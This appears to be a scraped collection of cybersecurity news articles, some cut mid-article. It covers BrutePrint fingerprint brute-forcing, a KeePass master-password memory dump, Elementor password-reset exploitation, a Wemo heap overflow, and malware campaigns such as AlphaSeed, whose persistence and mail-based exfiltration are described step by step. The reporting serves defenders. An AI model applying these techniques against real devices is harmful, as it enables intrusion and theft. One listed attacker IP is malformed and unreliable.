      "text": " Researchers at Tencent Labs and Zhejiang University have presented a new attack called 'BrutePrint,' which brute-forces fingerprints on modern smartphones to bypass user authentication and take control of the device.Brute-force attacks rely on many trial-and-error attempts to crack a code, key, or password and gain unauthorized access to accounts, systems, or networks.The Chinese researchers managed to overcome existing safeguards on smartphones, like attempt limits and liveness detection that protect against brute-force attacks, by exploiting what they claim are two zero-day vulnerabilities, namely Cancel-After-Match-Fail (CAMF) and Match-After-Lock (MAL).BrutePrint and SPI MITM attacks were tested against ten popular smartphone models, achieving unlimited attempts on all Android and HarmonyOS (Huawei) devices and ten additional attempts on iOS devices.The idea of BrutePrint is to perform an unlimited number of fingerprint image submissions to the target device until the user-defined fingerprint is matched.Contrary to how password cracking works, fingerprint matches use a reference threshold instead of a specific value, so attackers may manipulate the False Acceptance Rate (FAR) to increase the acceptance threshold and create matches more easily.BrutePrint stands in between the fingerprint sensor and the Trusted Execution Environment (TEE) and exploits the CAMF flaw to manipulate the multi-sampling and error-canceling mechanisms of fingerprint authentication on smartphones.CAMF injects a checksum error in the fingerprint data to stop the authentication process at a pre-mature point. This allows the attackers to try out fingerprints on the target device while its protection systems won't register failed attempts, hence giving them infinite tries.The MAL flaw enables the attackers to infer authentication results of the fingerprint images they try on the target device, even if the latter is in \"lockout mode.\"The lockout mode is a protection system activated after a certain number of failed consecutive unlock attempts. During the lockout \"timeout,\" the device shouldn't accept unlocking attempts, but MAL helps bypass this restriction.The final component of the BrutePrint attack is using a \"neural style transfer\" system to transform all fingerprint images in the database to look like the target device's sensor scanned them. This makes the images appear valid and thus have better chances of success.The researchers conducted experiments on ten Android and iOS devices and found that all were vulnerable to at least one flaw.The tested Android devices allow infinite fingerprint tryouts, so brute-forcing the user's fingerprint and unlocking the device is practically possible given enough time.On iOS, though, the authentication security is much more robust, effectively preventing brute-forcing attacks.Although the researchers found that iPhone SE and iPhone 7 are vulnerable to CAMF, they could only increase the fingerprint tryout count to 15, which isn't enough to brute-force the owner's fingerprint.Regarding the SPI MITM attack that involves hijacking the user's fingerprint image, all tested Android devices are vulnerable to it, while iPhones are again resistant.The researchers explain that the iPhone encrypts fingerprint data on the SPI, so any interception has little value in the context of the attack.In summary, the conducted experiments showed that the time it takes to complete BrutePrint against vulnerable devices successfully ranges between 2.9 and 13.9 hours when the user has enrolled one fingerprint.When multiple fingerprints are enrolled on the target device, the brute-forcing time drops to just 0.66 to 2.78 hours as the likelihood of producing matching images increases exponentially.At first glance, BrutePrint may not seem like a formidable attack due to requiring prolonged access to the target device. However, this perceived limitation should not undermine its value for thieves and law enforcement.The former would allow criminals to unlock stolen devices and extract valuable private data freely.The latter scenario raises questions about privacy rights and the ethics of using such techniques to bypass device security during investigations.This constitutes a rights violation in certain jurisdictions and could undermine the safety of certain people living in oppressive countries."

      "text": " A government-backed hacking group known as “Lancefly” has been seen using custom-made malware to attack governments, telecoms and other organizations across Asia.The latest campaign — which ran from the middle of 2022 through the first quarter of 2023 — targets organizations in South and Southeast Asia, in sectors including government, aviation, education and telecoms.The backdoor used by the group, named Merdoor, has been around since 2018 but has been used in a “highly targeted” fashion against “just a handful of networks and a small number of machines over the years,” Symantec said.The researchers tracked the backdoor’s use in two different campaigns and said the goal of both was intelligence gathering. Merdoor allows hackers to track actions, log keystrokes and communicate directly with an infected device.Intelligence gathering appears to be the main motivation, given the tools and the targeted sectors, Symantec said.“The similarities between this recent activity and earlier activity by Lancefly indicate that the group perhaps did not realize the earlier activity had been discovered, so it was not concerned about links being made between the two,” the researchers said. “Whether or not the exposure of this activity will lead to any alteration in how the group carries out its activity remains to be seen.”Symantec declined to name the country behind Lancefly or the countries that were targeted, but several other tools used by the group — including malware like PlugX and ShadowPad — are hallmarks of Chinese government hackers.The researchers said they were not comfortable attributing the campaign to Chinese actors, noting that none of the overlaps in tactics and tools “are strong enough to attribute this activity and the development of the Merdoor backdoor to an already-known attack group.”While the 2020 and 2021 campaigns used phishing lures based on the ASEAN Summit, Symantec researchers said the group now uses a variety of initial infection vectors, showing that they are “adaptable.”In addition to malware, the group also used other methods, including legitimate tools from Avast and WinRAR, to help gather data and exfiltrate it.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": "  The Treasury Department sanctioned Mikhail Matveev, an operator involved in three separate ransomware operations and who admitted to leaking data stolen from the Washington Metropolitan Police Department in 2021. (Photo by Bill O’Leary/The Washington Post via Getty Images)The Treasury Department placed economic sanctions on Mikhail Matveev, a Russian national that U.S. prosecutors say has been \"a central figure\" in multiple major ransomware operations since 2020.Matveev was charged with conspiracy to commit fraud, conspiracy to commit computer fraud and intentional damage to a protected computer. The department is offering a reward of up to $10 million for information leading to his arrest. Matveev is not private about his work, and has participated in numerous interviews where he has admitted to taking part in certain hacks. In April 2021, a Babuk ransomware attack hit the Washington Metropolitan Police Department, with the group claiming to have stolen 250 GB of data, including personnel files information on informants and other sensitive documents.“Negotiations yielded absolutely nothing. The affiliates wanted a certain ransom, and in the end, as we say in Russian, ‘shat their pants and ran’ when it came to uploading the data,” Matveev told Smilyanets. “They refused to accept the $100,000 ransom counteroffer by the MPD. But my take was: ‘If you do not accept the money, I will post this data on the blog.’ To which the affiliates asked me, terrified, not to do this. I told them that the stolen data is the property of the Babuk affiliate program…and started uploading the data to the blog.”The Treasury sanctions give authorities the ability to freeze any U.S.-based assets held by Matveev’s and prevents U.S. persons and entities from doing business with him in the future. The designation includes ransom payments, meaning victims who do pay Matveev could find themselves subject to fines or other regulatory action from the U.S. government.Derek is a senior editor and reporter at SC Media, where he has spent the past three years providing award-winning coverage of cybersecurity news across the public and private sectors.

      "text": " The threat actors behind the CopperStealer malware resurfaced with two new campaigns in March and April 2023 that are designed to deliver two novel payloads dubbed CopperStealth and CopperPhish.\"These payloads are responsible for downloading and running additional tasks. The rootkit also blocks access to blocklisted registry keys and prevents certain executables and drivers from running.\"The driver denylist contains byte sequences pertaining to Chinese security software companies like Huorong, Kingsoft, and Qihoo 360.CopperStealth also incorporates a task module that enables it to call out to a remote server and retrieve the command to be executed on the infected machine, equipping the malware to drop more payloads.The CopperPhish campaign, detected worldwide in April 2023, takes advantage of an analogous process to deploy the malware via PPI networks behind free anonymous file-sharing websites.\"The window has no controls that can be used to minimize or close it,\" the researchers explained. \"The victim could close the browser's process in Task Manager or Process Explorer, but they would also need to terminate the main payload process, otherwise the browser process will happen again due to the persistence thread.\"Once the sensitive details are entered in the page, the CopperPhish malware displays the message \"the identity verification has passed\" alongside a confirmation code that the victim can enter on the aforementioned screen.Providing the correct confirmation code also causes the malware to uninstall itself and delete all the dropped phishing files from the machine.\"The credential verification and confirmation code are two useful features that make this phishing kit more successful, as the victim cannot simply close the window or enter fake information just to get rid of the window,\" the researchers said.The attribution to Water Orthrus is based on the fact that both CopperStealth and CopperPhish share similar source code characteristics as that of CopperStealer, raising the possibility that all three strains may have been developed by the same author.The disparate objectives of the campaigns represent the evolution of the threat actor's tactics, indicating an attempt to add new capabilities to its arsenal and expand its financial horizons.Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."

      "title": "FTC to crack down on biometric tech, health app data privacy violations | SC Media",
      "text": "  Developers of consumer-driven health apps and tech can expect more stringent enforcement, as the Federal Trade Commission intends to update its Health Breach Notification Rule to clarify language around breach of security, user consent language and other functions.The FTC voted unanimously May 18 to update the HBNR, in addition to issuing a policy statement on its intent to combat unfair or deceptive practices tied to the collection, use and marketing of consumers’ biometric information and technologies. The risk of biometric tech violations is directly tied to the exposure of the digital identity of consumers and their privacy.In addition to a monetary penalty, the app developer is required to make a host of changes to its privacy and security program and inform users of the settlement with FTC. The unauthorized disclosures were tied to Premom’s use of third-party software development kits (SDKs), which were among the concerns named during the May 18 hearing, as well as the proliferation of telehealth and health apps“More and more companies are involved in the business of collecting health data, some of which fall outside the Health Insurance Portability and Accountability Act,” said Ben Wiseman, acting associate director for the division of privacy and identity protection at the FTC said during the meeting.“But it doesn’t mean that consumers have no privacy protections,” said Wiseman. “To the contrary, the FTC has wide jurisdiction over companies collecting health data and is committed to safeguarding consumers’ sensitive health information.”“Like pixels, SDKs are hidden pieces of code, and websites and apps that can transfer user information to advertisers,” Wiseman continued. “These cases and recent tech guidance make clear that the FTC will scrutinize company's use of this and any technology that transmits consumer sensitive information.”What’s more, health information encompasses a broader definition than what’s detailed in HIPAA. Medical data can include data from which a company or tech could infer sensitive health information about an individual. Wiseman pointed to consumers visiting or using a mental health treatment service.When their email was disclosed as part of BetterHelp’s advertising plan, it “was a disclosure of their health information because it effectively identified them as seeking or receiving mental health treatment,” he explained.The commission voted to revise the HBNR to clarify language that could trip up entities interacting with consumer health data, including definitions for the rule’s application to health apps and similar technologies not covered by HIPAA and the definition of “PHR identifiable health information.” The FTC also intends to better describe a “breach of security” under the rule to add the “unauthorized acquisition of identifiable health information that occurs as a result of a data security breach or an unauthorized disclosure” and improve the rule’s readability and promote compliance.Once the rule is published in the Federal Register, the public will have 60 days to submit comments on these proposed changes.The FTC has grown increasingly concerned over biometric surveillance, given the proliferation of technologies such as facial-, iris- or fingerprint-recognition tech, which collect and process biometric information to identify individuals. Biometrics can be used to deduce highly sensitive details about an individual, including their demeanor.Biometrics raise “significant consumer privacy and data security concerns and the potential for bias and discrimination,” according to the policy notice.Samuel Levine, director of the FTC’s Bureau of Consumer Protection, warned that, “Today’s policy statement makes clear that companies must comply with the law, regardless of the technology they are using.”To avoid these pitfalls, companies should holistically assess potential harms to consumers before collection of biometrics. A third-party should evaluate the particular context in which the technology will be used and consider the role of human operators, in addition to other preventable risks to the information.The policy statement details potential pitfalls for companies leveraging biometrics, including descriptions of possible deception means. In particular, that “false or unsubstantiated marketing claims relating to the validity, reliability, accuracy, performance, fairness, or efficacy of tech using biometric information,” constitute deceptive practices in violation of the FTC Act.Among the obvious deception elements, “businesses must not make false or unsubstantiated claims about real-world validity, accuracy, or performance of biometric information technologies when the claims are based on tests or audits that do not replicate real-world conditions or how the technology will be operationalized by its intended users,” according to the policy notice.The law also requires companies to implement reasonable privacy and data security measures the biometric information collected or maintained is protected, both internally and externally.The policy notice details the expectation for biometric use in companies, and potential enforcement of these technologies, moving forward. Developers should review these factors to ensure compliance, as the FTC continues to crack down on violations of consumer data privacy.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.U.S. cloud data analytics and log analysis firm Sumo Logic has confirmed discovering a potential security incident after its Amazon Web Services account was accessed using stolen credentials, reports TechCrunch.Picking an identity and access management solution isn’t always easy.

      "title": "FTC says fertility app Premom shared user health data with third parties | SC Media",
      "text": "  Premom “deceived users” by sharing their personal and health data with third parties, including two firms based in China,” according to a new Federal Trade Commission enforcement action against the fertility app.If approved, the app’s parent company will pay a $100,000 civil penalty for violating the FTC’s Health Breach Notification Rule.The proposed enforcement action would also require the company to inform the third parties they must delete the data shared by the app, in addition to notifying users of the unauthorized disclosures and detailing the FTC action. Easy Healthcare would also need to implement a comprehensive security and privacy program, including strong consumer data protections.“Premom broke its promises and compromised consumers’ privacy,” said Samuel Levine, director of the FTC’s Bureau of Consumer Protection, in a statement. “We will vigorously enforce the Health Breach Notification Rule to defend consumer's health data from exploitation.”  “Companies collecting this information should be aware that the FTC will not tolerate health privacy abuses,” he added.Premom is accused of disclosing the health data of its users to AppsFlyer and Google without notifying consumers of the unauthorized disclosures.The app is free to download and has hundreds of thousands of users who use Premom to track ovulation, periods, and other health data. Premom also urges users to provide details on their menstrual cycles, fertility, and pregnancy and to import data from other health apps.By sharing information with third parties, the data revealed “highly sensitive and private details” about its users, causing the unauthorized disclosure of users’ sexual and reproductive health, parental and pregnancy status, as well as other information about physical health conditions and status, according to the FTC complaint.The unauthorized disclosures were tied to Premom’s use of software development kits built by third parties into the app, including an SDK from app analytics provider Umeng and analytics provider Jiguang, which resulted in the disclosure of sensitive user data. The shared data included social media account details, precise geolocation information and mobile device data. The FTC argues “these non-resettable identifiers can be used to identify individuals.” In addition to the privacy violations, Premom is accused of failing to adequately encrypt the data shared with third parties, which could have led to interception or seizure. The company also failed to limit how these third parties could use the data.A proposed order filed by the Department of Justice would stop this practice and ban Premom’s parent company, Easy Healthcare, from sharing users’ personal health data with third parties for advertising purposes. The company would also be required to obtain consent before sharing health data for any other purpose and tell its users how their personal data will be used.Easy Healthcare would also be required to retain user data “for only as long as necessary to fulfill the purpose for which it was collected” and “permanently prohibit the company from making future misrepresentations about its privacy practices.”Before this year, the FTC did not wield its authority to tackle possible health data privacy violations not covered by The Health Insurance Portability and Accountability Act under the — though the breach notification rule has long given the agency the power to do so.The DOJ complaint shows similar allegations against Easy Healthcare: that the company “repeatedly and deceptively promised users in its privacy policies that it would not share their health information with third parties without users’ consent and that any data it did collect was non-identifiable and only used for its own analytics or advertising.”Easy Healthcare is also accused of failing to take reasonable measures to address privacy and security risks created by the use of third-party automated tracking tools, which allegedly led to users’ health data being shared for advertising purposes without “affirmative express consent,” according to the FTC.The order will not go into effect until it’s approved by a federal court.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.The new PCI DSS standard puts more focus on application security, with more tools, testing and documentation required of developers.GitHub has updated its Advanced Security platform available for Enterprise Cloud and Enterprise Server customers to provide new artificial intelligence-powered features in a bid to \"revolutionize\" secure app development, reports SecurityWeek.Vulnerabilities in API authorization have been named by Wallarm as the second greatest security risk facing APIs, emphasizing the ease of leveraging authorizations as backdoors as well as the urgent need to ensure authorization maintenance, reports SiliconAngle.Tue Aug 27 - Wed Aug 28Tue Dec 5On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "title": "KeePass exploit helps retrieve cleartext master password, fix coming soon",
      "text": " The popular KeePass password manager is vulnerable to extracting the master password from the application's memory, allowing attackers who compromise a device to retrieve the password even with the database is locked.Password managers allow users to create unique passwords for every online account and store the credentials in an easy-to-search database, or password vault, so you do not have to remember each one. However, to properly secure this password vault, users must remember the one master password used to unlock it and access stored credentials.This master password encrypts the KeePass password database, preventing it from being opened or read without first entering the password. However, once that master password is compromised, a threat actor can access all the credentials stored in the database.Therefore, for a password manager to be properly secured, it is critical that users guard the master password and not share it with anyone else.\"KeePass Master Password Dumper is a simple proof-of-concept tool used to dump the master password from KeePass's memory. Apart from the first password character, it is mostly able to recover the password in plaintext,\" warns the security researcher on the GitHub page for the exploit tool.\"No code execution on the target system is required, just a memory dump. It doesn't matter where the memory comes from - can be the process dump, swap file (pagefile.sys), hibernation file (hiberfil.sys) or RAM dump of the entire system. It doesn't matter whether or not the workspace is locked.\"The flaw exists because the software uses a custom password entry box named \"SecureTextBoxEx,\" which leaves traces of each character the user types in the memory.\"KeePass 2.X uses a custom-developed text box for password entry, SecureTextBoxEx. This text box is not only used for the master password entry, but in other places in KeePass as well, like password edit boxes (so the attack can also be used to recover their contents),\" explains vdohney.The vulnerability impacts the latest version of KeePass, 2.53.1, and as the program is open-source, any project forks are likely affected.KeePass 1.X, KeePassXC, and Strongbox do not appear to be impacted by CVE-2023-32784, according to the developer of the password dumping tool.Also, while the PoC was tested on Windows, the exploit should also work for Linux and macOS, with some modifications, as the problem isn't specific to the OS but how KeePass handles user input.Since memory dumps must be retrieved for the KeePass master password to be recovered, the exploitation of CVE-2023-32784 requires physical access or malware infection on the target machine.However, information-stealing malware could quickly check if KeePass exists on a computer or is running, and if so, dump the program's memory and send it and the KeePass database back to the attacker for offline retrieval of the cleartext password from the memory dump.BleepingComputer tested vdohney's 'keepass-password-dumper' tool by installing KeePass on a test device and creating a new database with the master password 'password123,' as shown below.We then locked our KeePass workspace, which prevents access to it unless you enter the master password again.In our tests, you can use Process Explorer to dump the memory of the KeePass project, but it requires a full memory dump, and not a minidump, to work correctly. No elevated privileges are needed to dump the processes' memory.After compiling vdohney's tool using Visual Studio, we executed it against our memory dump, and it quickly recovered most of our cleartext password, with just the first two letters missing.While this is not the complete password, determining what characters are missing would be fairly easy.The researcher also warns that master passwords used in the past can remain in memory, so they can be retrieved even if KeePass is no longer running on the breached computer.The developer of KeePass, Dominik Reichl, received the bug report and promised to roll out a fix for CVE-2023-32784 on version 2.54, expected sometime in July 2023.However, Reichl told BleepingComputer that KeePass version 2.54 is more likely to be released to users in about two weeks, so it should be out by early June.KeePass 2.54 for Windows will have both, while macOS and Linux versions will only get the second enhancement.The creator of the PoC has confirmed that he can no longer reproduce the attack with the two security enhancements in place, so the fix appears to be effective.Even after the new version is released, the master password may still be stored in memory files. The researcher warns that to be 100% safe that it is not lurking on the system, you would need to delete your system's swap and hibernation files, format your hard drive using the \"overwrite data\" mode to prevent data recovery, and do a fresh OS install.For most, though, restarting the computer, clearing your swap file and hibernation files, and not using KeePass until the new version is released are reasonable safety measures for the time being.Even then, for the best protection, be super vigilant about not downloading programs from untrusted sites and beware of phishing attacks that may infect your devices, giving threat actors remote access to your device and your KeePass database."

      "text": " Hackers are now actively probing for vulnerable Essential Addons for Elementor plugin versions on thousands of WordPress websites in massive Internet scans, attempting to exploit a critical account password reset flaw disclosed earlier in the month.The critical-severity flaw is tracked as CVE-2023-32243 and impacts Essential Addons for Elementor versions 5.4.0 to 5.7.1, allowing unauthenticated attackers to arbitrarily reset the passwords of administrator accounts and assume control of the websites.On May 14th, 2023, researchers published a proof-of-concept (PoC) exploit on GitHub, making the tool widely available to attackers.At the time, a BleepingComputer reader and website owner reported that their site was hit by hackers who reset the admin password by leveraging the flaw. Still, the scale of the exploitation was unknown.A Wordfence report published yesterday sheds more light, with the company claiming to observe millions of probing attempts for the presence of the plugin on websites and has blocked at least 6,900 exploitation attempts.On the day after the disclosure of the flaw, WordFence recorded 5,000,000 probing scans looking for the plugin's 'readme.txt' file, which contains the plugin's version information, and hence determines if a site is vulnerable.Most of these requests came from just two IP addresses, '185.496.220.26' and '185.244.175.65.'As for the exploitation attempts, the IP address '78.128.60.112' had a considerable volume, utilizing the PoC exploit released on GitHub. Other high-ranking attacking IPs count between 100 and 500 attempts.Website owners using the 'Essential Addons for Elementor' plugin are advised to apply the available security update by installing version 5.7.2 or later immediately.\"Considering how easily this vulnerability can be successfully exploited, we highly recommend all users of the plugin update ASAP to ensure their site is not compromised by this vulnerability,\" advises Wordfence.Additionally, website administrators should use the indicators of compromise listed on Wordfence's report and add the offending IP addresses to a blocklist to stop these and future attacks.Users of Wordfence's free security package will be covered by protection against CVE-2023-32243 on June 20, 2023, so they're currently exposed too."

This allowed UNC3944 a direct connection to the Azure VM via Remote Desktop, from which they can facilitate a password reset of an admin account, the researchers said.The attack demonstrates the evolution and growth in sophistication of both attackers' evasion tactics and targeting, the latter of which now goes beyond the network and the endpoint directly to mobile devices and the cloud, notes Kern Smith, vice president of Americas, sales engineering at mobile security firm Zimperium.\"Increasingly, these attacks are targeting users where organizations have no visibility using traditional security tooling — such as smishing — in order to gain the information needed to enable these types of attacks,\" he says.To thwart this type of threat, organizations must first prevent targeted smishing campaigns \"in a way that enables their workforce while not inhibiting productivity or impacting user privacy,\" Smith says.Mandiant recommends restricting access to remote administration channels and disabling SMS as a multifactor authentication method wherever possible.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Millions of Android phone users around the world are contributing daily to the financial wellbeing of an outfit called the Lemon Group, merely by virtue of owning the devices.Unbeknownst to those users, the operators of the Lemon Group have pre-infected their devices before they even bought them. Now, they're quietly using their phones as tools for stealing and selling SMS messages and one-time passwords (OTPs), serving up unwanted ads, setting up online messaging and social media accounts, and other purposes.Lemon Group itself has claimed it has a base of nearly 9 million Guerrilla-infected Android devices that its customers can abuse in different ways. But Trend Micro believes the actual number may be even higher.Lemon Group is among several cybercriminal groups that have built profitable business models around pre-infected Android devices in recent years.Researchers from Trend Micro first began unraveling the operation when doing forensic analysis on the ROM image of an Android device infected with malware dubbed \"Guerrilla.\" Their investigation showed the group has infected devices belonging to Android users in 180 countries. More than 55% of the victims are in Asia, some 17% are in North America and nearly 10% in Africa. Trend Micro was able to identify more than 50 brands of — mostly inexpensive — mobile devices.\"Following our timeline estimates, the threat actor has spread this malware over the last five years,\" the researchers said. \"A compromise on any significant critical infrastructure with this infection can likely yield a significant profit for Lemon Group in the long run at the expense of legitimate users.\"The issue of Android phones being shipped with malware pre-installed on them is certainly not new. Numerous security vendors — including Trend Micro, Kaspersky, and Google — have reported over the years on bad actors introducing potentially harmful applications at the firmware layer on Android devices.In many instances, the tampering has happened when an Android OEM, looking to add additional features to a standard Android system image, outsourced the task to a third-party. In some instances, bad actors have also managed to sneak in potentially harmful applications and malware via firmware over-the-air (FOTA) updates. A few years ago, most of the malware found preinstalled on Android devices were information stealers and ad servers.Trend Micro's research in the Guerrilla malware campaign showed overlaps — in the command-and-control infrastructure and communications for instance — between Lemon Group's operations and that of Triada. For instance, Trend Micro found the Lemon Group implant tampering with the Zygote process and essentially becoming a part of every app on a compromised device. Also, the malware consists of a main plugin that loads multiple other plugins, each with a very specific purpose. Those include one designed to intercept SMS messages and read OTPs from platforms such as WhatsApp, Facebook, and a shopping app called JingDong.Another Guerrilla plugin allows Lemon Group to essentially rent out an infected phone's resources from short periods to customers; a cookie plugin hooks to Facebook-related apps on the user's devices for ad-fraud related uses; and a WhatsApp plugin hijacks a user's WhatsApp sessions to send unwanted messages. Another plugin enables silent installation of apps that would require installation permission for specific activities.\"We identified some of these businesses used for different monetization techniques, such as heavy loading of advertisements using the silent plugins pushed to infected phones, smart TV ads, and Google play apps with hidden advertisements,\" according to Trend Micro's analysis. \"We believe that the threat actor's operations can also be a case of stealing information from the infected device to be used for big data collection before selling it to other threat actors as another post-infection monetization scheme.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Users can then control the device via a mobile app, essentially offering a way to make old-school lamps, fans, and other utility items \"smart.\" The app integrates with Alexa, Google Assistant, and Apple Home Kit, while offering additional features like scheduling for convenience. Igal Zeifman, vice president of marketing for Sternum, tells Dark Reading that's a low estimate for the attack surface. \"That's us being very conservative,\" he notes. \"We had three in our lab alone when the research started. Those are now unplugged.\"He adds, \"If businesses are using this version of the Wemo Plugin inside their network, they should stop or (at the very least) make sure that the Universal Plug-n-Play (UPNP) ports are not exposed to remote access. If that device plays a critical role or is connected to a critical network or asset, you are not in great shape.\"The bug exists in the way the firmware handles the naming of the Smart Plug. While \"Wemo mini 6E9\" is the default name of the device out of the box, users can rename it as they wish using what's designated in the firmware as the \"FriendlyName\" variable — changing it to \"kitchen outlet\" for example or similar.\"This option for user input already had our Spidey senses tingling, especially when we saw that changing the name in the app came with some guardrails, [specifically a 30-character limit],\" Sternum researchers noted. \"For us, this immediately raised two questions: 'Says who?' and 'What happens if we manage to make it more than 30 characters?'\"When the mobile app didn't allow them to create a name longer than 30 characters, they decided to connect directly to the device via pyWeMo, an open-source Python module for the discovery and control of WeMo devices. They found that circumventing the app allowed them to get around the guardrail, in order to successfully input a longer name.\"The restriction was only enforced by the app itself and not by the firmware code,\" they noted. \"Input validation like this should not be managed just on the 'surface' level.\"Observing how the overstuffed 'FriendlyName' variable was handled by the memory structure, the researchers saw that the metadata of the heap was being corrupted by any name longer than 80 characters. Those corrupted values were then being used in subsequent heap operations, thus leading to short crashes. This resulted in a buffer overflow and the ability to control the resulting memory re-allocation, according to the analysis.\"It's a good wake-up call about the risk of using connected devices without any on-device security, which is 99.9% of devices today,\" Zeifman says.While Sternum isn't releasing a proof-of-concept exploit or enumerating what a real-world attack flow would look like in practice, Zeifman says the vulnerability isn't difficult to exploit. An attacker would need either network access, or remote Universal Plug-n-Play access if the device is open to the Internet.\"Outside of that, it's a trivial buffer overflow on a device with an executable heap,\" he explains. \"Harder bastions have fallen.\"He noted that it's likely that attacks could be carried out via Wemo's cloud infrastructure option as well.\"Wemo products also implement a cloud protocol (basically a STUN tunnel) that was meant to circumvent network address traversal (NAT) and allow the mobile app to operate the outlet through the Internet,\" Zeifman says. \"While we didn't look too deeply into Wemo's cloud protocol, we wouldn't be surprised if this attack could be implemented that way as well.\"In the absence of a patch, device users do have some mitigations they can take; for instance, as long as the Smart Plug is not exposed to the Internet, the attacker would have to obtain access to the same network, which makes exploitation more complicated.Sternum detailed the following common-sense recommendations:IoT devices should be equipped with \"the same level of endpoint security that we expect other assets to have, our desktops, laptops, servers, etc.,\" he says. \"If your heart monitor is less secure than the gaming laptop, something has gone horribly wrong – and it has.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " S2W BLOG--ShareAuthor: BLKSMTH | S2W TALONLast Modified: May 17, 20232023년 5월 6일, VirusTotal에서 확인된 샘플에서 Kimsuky 그룹의 새로운 악성코드로 추정되는 샘플이 발견되어 분석을 진행하였다. 해당 샘플은 다음(Daum)메일 서비스와 통신하여 악성행위를 수행하는 AppleSeed 악성코드 와는 다르게 네이버 메일로 통신을 시도하며, 또한 Go 언어로 작성된 악성코드라는 점에서 새로운 악성코드 유형으로 예상되었다.해당 악성코드는 VMProtect로 패킹되어 있으며, “E:/Go_Project/src/alpha/naver_crawl_spy/” 경로를 내부에 포함하고 있다. 이후 네이버 메일 서비스와 통신하여 정보탈취 및 명령 실행 등의 기능을 수행한다. 기존 Kimsuky 그룹은 아이디와 비밀번호로 네이버 메일 서비스에 로그인하는 방식을 사용했지만, 이번 악성코드에서는 네이버 로그인에 필요한 Cookie값을 이용해 Chrome Devtools 프로토콜을 사용하도록 서포팅하는 클라이언트 프로그램인 ChromeDP으로 로그인하는 방식을 사용한다. 이러한 방식의 변화는 C&C 서버로 사용하는 메일계정 정보를 노출하지 않으려는 전략으로 추정되고 있다. 아이디와 패스워드가 확보되는 경우, 누구나 해당 계정으로 네이버 메일 서비스에 접속하여 모든 행위를 수행할 수 있지만, 쿠키 값을 통한 로그인의 경우 별도로 쿠키값을 위조하는 작업이 필요하다.해당 악성코드는 Go언어로 작성되어 있어 기존 Kimsuky 그룹이 사용하는 악성코드와 코드 유사성 비교가 확인하기 어려웠다. 또한, 분석 당시 악성코드가 사용하는 Cookie 값이 유효하지 않아 추가 악성행위가 식별되지 않았다. 하지만, 기존 Kimsuky 그룹의 AppleSeed 악성코드 유형 중 다음 메일을 C&C서버로 사용하는 유형과 파일 암호화 방식, 메일 전송 쓰레드, 메일함 이름 등의 유사성이 존재한다는 점에서 Kimsuky 그룹의 새로운 악성코드로 추정하고 있다.S2W의 위협 연구 및 인텔리전스 센터인 Talon은 해당 악성코드가 기존 AppleSeed 악성코드를 Go언어 버전으로 변경한 악성코드로 추정하고 있으며, “E:/Go_Project/src/alpha/naver_crawl_spy/”라는 경로명을 사용하고 있다는 점에서 해당 악성코드 유형을 “AlphaSeed”으로 명명하였다.Go언어로 작성된 AlphaSeed 악성코드는 네이버 메일로부터 명령을 받아 수행하며, 감염된 시스템의 정보를 수집 및 탈취 기능을 수행한다. 해당 악성코드는 다음과 같은 실행 과정을 보여준다.실행시 가장 먼저 특정 경로에 작업 디렉토리를 생성하고 및 작업 경로로 지정한다. 이후 자기 자신을 해당 경로에 복사한다.현재 프로세스가 EXE 인지 체크한다. EXE 파일 일 경우, 작업 디렉토리에 schtaskw.exe 파일명으로 복사 및 실행하고, 아닐 경우 powermgmt.dat 파일로 복사한 후 regsvr32.exe로 로드한다. 이는 공격자가 DLL 파일 타입 외에도 EXE 파일 타입으로도 해당 악성코드를 실행할 수 있다는 것을 시사한다.이후 부팅 시 항상 자동으로 악성코드가 실행되도록 “MS_SecSvc” 라는 이름으로 레지스트리에 등록한다.자가삭제 기능을 수행하기 위해 BAT 파일을 생성하여 실행한다. 총 2개의 BAT 파일을 생성하는데, 원본 DLL 파일을 삭제하는 BAT 파일과, 이 BAT 파일을 삭제하는 별도의 BAT 파일을 생성한다.실행된 원본 파일이 powermgmt.dat 파일인지 확인하고 아닐 경우, regsvr32.exe를 통해 로드 후 종료한다. 실제 악성 기능은 로드된 powermgmt.dat 파일을 통해 수행된다.Stage 2가 실행되면, 악성행위에 필요한 “agent_Agent” 구조체를 초기화한다. 이 구조체는 악성행위 실행시 참고된다.감염된 시스템으로부터 탈취한 파일에 대하여 암호화를 수행하거나, 공격자 메일로부터 받은 명령을 복호화할 때 RC4와 RSA 알고리즘이 사용된다. 악성코드는 랜덤하게 RC4 Key를 생성하고, 내부에 존재하는 ParsePKCS1PublicKey 함수를 통해 암호화를 위한 Public Key를 생성한다. 이후, Public Key를 통해 RC4 Key를 암호화한다. 공격자 메일로부터 받은 명령 또한 암호화되어 있는데, 이 데이터는 악성코드 내부에 존재하는 별도의 Private Key를 통해 RSA를 복호화하여 RC4 Key를 획득하고, 이후 획득한 RC4 Key로 데이터를 복호화한다.감염된 시스템의 정보를 탈취하기 위해 3개의 함수를 GoRoutine을 통해 호출한다. 각각의 함수는 키로깅, 스크린샷, 재시작과 같은 기능을 수행한다.goKeylog 함수에서는 감염된 시스템에 입력되는 키 입력 데이터를 작업 디렉토리 하위에 cache_w.db 파일로 저장한다. 이후, 파일을 암호화하고, 네이버 메일을 통해 전송한다.goSshot에서는 감염된 시스템의 현재 데스크탑 화면을 캡쳐하여 파일로 저장한다. 데스크탑 화면 캡쳐를 위해 Github에 공개된 “kbinani”의 screenshot 패키지를 사용한다.AlphaSeed 악성코드는 네이버 로그인에 필요한 별도의 아이디와 패스워드 대신, 유효한 Cookie 값을 이용해 로그인하는 방식을 사용하고 있다. 